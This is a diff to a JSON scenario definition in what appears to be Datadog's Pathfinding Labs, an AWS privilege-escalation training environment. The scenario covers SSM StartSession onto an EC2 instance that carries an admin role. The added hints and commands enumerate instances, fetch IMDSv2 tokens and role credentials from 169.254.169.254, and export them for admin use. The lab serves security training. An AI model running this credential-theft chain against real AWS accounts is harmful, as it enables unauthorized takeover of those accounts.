@@ -1,5 +1,5 @@
 {
-  "displayName": "One-Hop Privilege Escalation: ssm:StartSession to EC2 with Admin Role",
+  "displayName": "SSM Session Start to Admin",
   "name": "ssm-001-ssm-startsession",
   "description": "Start interactive session on EC2 instances with privileged roles to extract credentials via SSM StartSession",
   "costEstimate": "$5/mo",
@@ -31,25 +31,29 @@
     "modulePath": "modules/scenarios/single-account/privesc-one-hop/to-admin/ssm-001-ssm-startsession"
   },
   "githubUrl": "https://github.com/DataDog/pathfinding-labs/tree/main/modules/scenarios/single-account/privesc-one-hop/to-admin/ssm-001-ssm-startsession",
-  "schemaVersion": "3.0.0",
+  "schemaVersion": "4.0.0",
   "permissions": {
     "required": [
       {
         "permission": "ssm:StartSession",
+        "principal": "pl-prod-ssm-001-to-admin-starting-user",
         "resource": "arn:aws:ec2:*:{account_id}:instance/{target_instance_id}"
       }
     ],
     "helpful": [
       {
         "permission": "ec2:DescribeInstances",
+        "principal": "pl-prod-ssm-001-to-admin-starting-user",
         "purpose": "discover target EC2 instances and identify which have privileged IAM roles attached"
       },
       {
         "permission": "ssm:DescribeInstanceInformation",
+        "principal": "pl-prod-ssm-001-to-admin-starting-user",
         "purpose": "identify which instances have the SSM agent running and are reachable"
       },
       {
         "permission": "sts:GetCallerIdentity",
+        "principal": "pl-prod-ssm-001-to-admin-starting-user",
         "purpose": "verify credentials after exfiltration to confirm the level of access obtained"
       }
     ]
@@ -125,14 +129,21 @@
         "label": "ssm:StartSession",
         "description": "Start an interactive shell session on the EC2 instance using SSM Session Manager. This provides SSH-like access through the AWS API without requiring network connectivity, open ports, or SSH keys.\n",
         "hints": [
-          "You can interact with EC2 instances via the AWS API without SSH.",
-          "Look for EC2 instances that have privileged IAM roles attached.",
-          "Browse to https://pathfinding.cloud/paths/ssm-001 for technique details."
+          "Start by reviewing the policy attached to this user -- what AWS service does the permission reference, and what action does it let you perform?",
+          "Use ec2:DescribeInstances to enumerate running instances. Look at the IamInstanceProfile field on each instance -- it tells you what role is attached.",
+          "Use ssm:DescribeInstanceInformation to confirm which instances have the SSM agent running and are reachable. Look for PingStatus = Online.",
+          "Check which instance resources this user has ssm:StartSession permission on -- the policy may scope it to a specific instance or use a wildcard.",
+          "You will need the AWS Session Manager plugin installed locally for the start-session command to work. It is a separate download from the AWS CLI.",
+          "Browse to https://pathfinding.cloud/paths/ssm-001 for full technique details."
         ],
         "commands": [
           {
-            "description": "Discover EC2 instances with SSM connectivity",
-            "command": "aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,ComputerName,PlatformType]' --output table"
+            "description": "Enumerate running EC2 instances and their attached IAM roles",
+            "command": "aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile.Arn]' --output table"
+          },
+          {
+            "description": "Confirm SSM agent is online on the target instance",
+            "command": "aws ssm describe-instance-information --query 'InstanceInformationList[*].[InstanceId,PingStatus,ComputerName]' --output table"
           },
           {
             "description": "Start an interactive session on the target instance",
@@ -146,24 +157,28 @@
         "label": "curl IMDS",
         "description": "From within the interactive SSM session, query the EC2 Instance Metadata Service to retrieve the temporary AWS credentials (access key, secret key, session token) for the administrative role attached to the instance.\n",
         "hints": [
-          "Once you have a shell on the instance, there is a well-known internal endpoint that provides identity and credentials.",
-          "The instance metadata service is accessible from within the instance at 169.254.169.254.",
-          "If IMDSv2 is enabled, you need to request a session token first before querying metadata endpoints.",
-          "Query the IAM security credentials endpoint to retrieve temporary role credentials.",
-          "The credentials you retrieve are temporary STS credentials -- export them as environment variables to use from your local machine."
+          "Once you have a shell on the instance, there is a well-known internal endpoint accessible only from within the instance that provides identity and credentials.",
+          "The instance metadata service (IMDS) is reachable at 169.254.169.254 from inside any EC2 instance.",
+          "If IMDSv2 is required, you must first request a session token with a PUT request before querying any metadata endpoints.",
+          "Query the IAM security-credentials path under the metadata endpoint to discover the role name, then query that role's path to get temporary credentials.",
+          "The response contains AccessKeyId, SecretAccessKey, and Token fields -- export all three as environment variables on your local machine to use these credentials."
         ],
         "commands": [
           {
+            "description": "Request an IMDSv2 session token (required if IMDSv2 is enforced)",
+            "command": "TOKEN=$(curl -X PUT 'http://169.254.169.254/latest/api/token' -H 'X-aws-ec2-metadata-token-ttl-seconds: 21600' 2>/dev/null)"
+          },
+          {
             "description": "Get the role name from IMDS",
-            "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/"
+            "command": "ROLE_NAME=$(curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null) && echo $ROLE_NAME"
           },
           {
             "description": "Retrieve the temporary credentials for the admin role",
-            "command": "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/pl-prod-ssm-001-to-admin-ec2-role"
+            "command": "curl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME 2>/dev/null"
           },
           {
-            "description": "Export the credentials to your local shell and verify admin access",
-            "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> && aws iam list-users"
+            "description": "Export the extracted credentials locally and verify admin access",
+            "command": "export AWS_ACCESS_KEY_ID=<AccessKeyId> AWS_SECRET_ACCESS_KEY=<SecretAccessKey> AWS_SESSION_TOKEN=<Token> && aws iam list-users --max-items 3"
           }
         ]
       }
